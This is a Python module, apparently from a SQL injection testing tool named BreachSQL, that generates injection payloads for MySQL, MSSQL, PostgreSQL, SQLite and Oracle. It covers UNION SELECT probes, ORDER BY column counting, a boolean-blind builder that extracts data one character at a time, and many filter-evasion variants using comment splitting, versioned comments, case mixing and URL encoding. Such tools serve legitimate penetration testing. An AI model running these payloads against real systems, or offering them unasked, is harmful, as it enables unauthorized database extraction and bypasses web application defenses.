# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""UNION-based probes and string/substring helper payloads."""

from __future__ import annotations

import random
import string
from typing import List

BREACH_MARKER_PREFIX = "BreachSQL_"


def make_marker() -> str:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{BREACH_MARKER_PREFIX}{suffix}"


CONCAT_PAYLOADS: dict[str, List[str]] = {
    "mysql": [
        "' AND 1=1 AND CONCAT('foo','bar')='foobar'-- -",
        "' UNION SELECT CONCAT('foo','bar'),NULL-- -",
        "' UNION SELECT CONCAT(0x666f6f,0x626172),NULL-- -",
    ],
    "mariadb": [
        "' AND 1=1 AND CONCAT('foo','bar')='foobar'-- -",
        "' UNION SELECT CONCAT('foo','bar'),NULL-- -",
    ],
    "mssql": [
        "' AND 1=1 AND 'foo'+'bar'='foobar'-- -",
        "' UNION SELECT 'foo'+'bar',NULL-- -",
        "'; SELECT 'foo'+'bar'-- -",
    ],
    "postgres": [
        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
        "' UNION SELECT 'foo'||'bar',NULL-- -",
    ],
    "sqlite": [
        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
        "' UNION SELECT 'foo'||'bar',NULL-- -",
    ],
    "oracle": [
        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
        "' UNION SELECT 'foo'||'bar',NULL FROM dual-- -",
    ],
    "auto": [
        "' AND CONCAT('foo','bar')='foobar'-- -",
        "' AND 'foo'||'bar'='foobar'-- -",
        "' AND 'foo'+'bar'='foobar'-- -",
    ],
}

SUBSTRING_PROBES: dict[str, List[str]] = {
    "mysql": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
        "' AND MID('foobar',4,2)='ba'-- -",
    ],
    "mariadb": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
    ],
    "mssql": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
    ],
    "postgres": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
    ],
    "sqlite": [
        "' AND SUBSTR('foobar',4,2)='ba'-- -",
    ],
    "oracle": [
        "' AND SUBSTR('foobar',4,2)='ba'-- -",
    ],
    "auto": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
        "' AND SUBSTR('foobar',4,2)='ba'-- -",
    ],
}


def get_concat_payloads(dbms: str) -> List[str]:
    """Return string concatenation probe payloads for *dbms*."""
    return CONCAT_PAYLOADS.get(dbms, CONCAT_PAYLOADS["auto"])


def get_substring_probes(dbms: str) -> List[str]:
    """Return substring probe payloads for *dbms*."""
    return SUBSTRING_PROBES.get(dbms, SUBSTRING_PROBES["auto"])


def make_substring_payload(dbms: str, expr: str, pos: int, char: str) -> str:
    """Build a boolean-blind payload that checks the character at *pos* in *expr* equals *char*."""
    substr_fn = "SUBSTR" if dbms in ("sqlite", "oracle") else "SUBSTRING"
    return f"' AND ASCII({substr_fn}(({expr}),{pos},1))={ord(char)}-- -"


def order_by_probes(max_cols: int = 20) -> List[str]:
    """Generate ORDER BY N probes to determine column count."""
    probes = []
    for n in range(1, max_cols + 1):
        probes.append(f"' ORDER BY {n}-- -")
        probes.append(f"' ORDER BY {n}#")
        probes.append(f"') ORDER BY {n}-- -")
        probes.append(f"') ORDER BY {n}#")
        probes.append(f"')) ORDER BY {n}-- -")
        probes.append(f"')) ORDER BY {n} --")
        probes.append(f" ORDER BY {n}-- -")
        probes.append(f" ORDER BY {n}#")
        probes.append(f"' GROUP BY {n}-- -")
        probes.append(f"' /**/ORDER/**/BY/**/ {n}-- -")
        probes.append(f"' /*!ORDER BY*/ {n}-- -")
        probes.append(f"'/*!50000ORDER*//**//*!50000BY*/ {n}-- -")
        probes.append(f"' order/**_**/by {n}-- -")
        probes.append(f"' AND 0 order by {n}-- -")
        probes.append(f"%0Aorder%0Aby%0A{n}-- -")
        probes.append(f"%23%0Aorder%23%0Aby%23%0A{n}-- -")
    return probes


def _marker_to_char_expr(marker: str) -> str:
    return "char(" + ",".join(str(ord(c)) for c in marker) + ")"


def union_null_probes(col_count: int, marker: str) -> List[str]:
    """Generate UNION SELECT probes for a known column count."""
    char_marker = _marker_to_char_expr(marker)
    payloads = []
    for pos in range(col_count):
        cols_str = ["NULL"] * col_count
        cols_str[pos] = f"'{marker}'"
        cols_cast = ["NULL"] * col_count
        cols_cast[pos] = f"CAST('{marker}' AS CHAR)"
        cols_int = [str(i + 1) for i in range(col_count)]
        cols_int[pos] = f"'{marker}'"
        cols_char = ["NULL"] * col_count
        cols_char[pos] = char_marker

        for cols in (cols_str, cols_cast, cols_int, cols_char):
            inner = ",".join(cols)
            payloads.append(f"' UNION SELECT {inner}-- -")
            payloads.append(f"' UNION SELECT {inner}#")
            payloads.append(f" UNION SELECT {inner}-- -")
            payloads.append(f" UNION SELECT {inner}#")
            payloads.append(f"') UNION SELECT {inner}-- -")
            payloads.append(f"') UNION SELECT {inner}#")
            payloads.append(f"')) UNION SELECT {inner}-- -")
            payloads.append(f"')) UNION SELECT {inner}#")
            payloads.append(f"' UNION ALL SELECT {inner}-- -")
            payloads.append(f"' Union Distinctrow Select {inner}-- -")
            payloads.append(f"' /*!50000UNION SELECT*/ {inner}-- -")
            payloads.append(f"' /*!50000UniON SeLeCt*/ {inner}-- -")
            payloads.append(f"' AnD null UNiON SeLeCt {inner}-- -")
            payloads.append(f"' And False Union Select {inner}-- -")
            payloads.append(f"' /**/uNIon/**/sEleCt/**/ {inner}-- -")
            payloads.append(f"' union /*!50000%53elect*/ {inner}-- -")
    return payloads
